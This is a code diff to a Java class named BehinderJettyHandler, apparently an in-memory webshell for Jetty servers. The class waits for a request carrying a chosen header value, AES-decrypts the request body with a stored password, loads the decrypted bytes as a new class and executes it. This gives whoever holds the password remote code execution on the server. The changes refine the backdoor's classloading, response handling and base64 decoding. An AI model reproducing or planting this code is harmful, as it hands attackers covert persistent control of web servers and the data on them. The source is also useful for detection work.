@@ -16,11 +16,6 @@ public class BehinderJettyHandler extends ClassLoader {
     public static String headerName;
     public static String headerValue;
 
-    @SuppressWarnings("all")
-    public Class<?> g(byte[] b) {
-        return super.defineClass(b, 0, b.length);
-    }
-
     public BehinderJettyHandler() {
     }
 
@@ -54,22 +49,22 @@ public class BehinderJettyHandler extends ClassLoader {
         try {
             String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
             if (value != null && value.contains(headerValue)) {
-                if (baseRequest != null) {
-                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
-                }
                 Object session = request.getClass().getMethod("getSession").invoke(request);
                 session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                 Map<String, Object> map = new HashMap<String, Object>(3);
                 map.put("request", request);
-                map.put("response", getInternalResponse(response));
+                map.put("response", unwrapResponse(response));
                 map.put("session", session);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                 BufferedReader reader = (BufferedReader) request.getClass().getMethod("getReader").invoke(request);
                 String parameter = reader.readLine();
                 byte[] bytes = c.doFinal(base64Decode(parameter));
-                Object instance = (new BehinderJettyHandler(this.getClass().getClassLoader())).g(bytes).newInstance();
+                Object instance = (new BehinderJettyHandler(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                 instance.equals(map);
+                if (baseRequest != null) {
+                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
+                }
                 return true;
             }
         } catch (Throwable e) {
@@ -78,14 +73,26 @@ public class BehinderJettyHandler extends ClassLoader {
         return false;
     }
 
-    public Object getInternalResponse(Object response) {
+    @SuppressWarnings("all")
+    public Object unwrapResponse(Object response) {
+        Object internalResponse = response;
         while (true) {
             try {
-                response = getFieldValue(response, "response");
+                Object r = getFieldValue(response, "response");
+                if (r == internalResponse) {
+                    return r;
+                } else {
+                    internalResponse = r;
+                }
             } catch (Exception e) {
-                return response;
+                return internalResponse;
             }
         }
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> g(byte[] b) {
+        return super.defineClass(b, 0, b.length);
     }
 
     @SuppressWarnings("all")
@@ -109,7 +116,7 @@ public class BehinderJettyHandler extends ClassLoader {
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -117,12 +124,9 @@ public class BehinderJettyHandler extends ClassLoader {
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
